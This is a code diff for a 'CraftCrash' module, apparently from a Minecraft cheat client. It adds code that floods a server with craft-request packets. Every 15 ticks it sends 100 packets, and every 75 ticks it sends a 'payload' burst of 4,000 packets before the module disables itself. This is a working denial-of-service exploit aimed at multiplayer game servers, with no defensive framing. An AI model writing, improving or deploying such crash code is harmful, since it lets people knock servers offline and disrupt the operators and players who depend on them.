@@ -51,19 +51,32 @@ public class CraftCrash extends Module {
     @Override
     public void tick() {
         if (client.currentScreen instanceof CraftingScreen && !isListening) {
+            ticks++;
             int sync = client.player.currentScreenHandler.syncId;
-            superticks++;
-            if (superticks % 15 == 0) {
-                for (int i = 0; i < 3; i++) {
+            if(ticks % 15 == 0){
+                Notification.create(1000, "CraftCrash", Notification.Type.SUCCESS, "Disabling stream...");
+                for(int i = 0; i < 50; i++){
                     client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, stick, true));
                     client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, buton, true));
                 }
+            }
+            if(ticks % 75 == 0){
+                Notification.create(1000, "CraftCrash", Notification.Type.SUCCESS, "Sent Payload!");
+                for(int i = 0; i < 2000; i++){
+                    client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, stick, true));
+                    client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, buton, true));
+                }
+                this.setEnabled(false);
             }
         }
     }
 
     @Override
     public void enable() {
+        this.isListening = true;
+        stick = null;
+        buton = null;
+        Notification.create(1000, "CraftCrash", Notification.Type.INFO, "Click two crafting recipies");
     }
 
     @Override
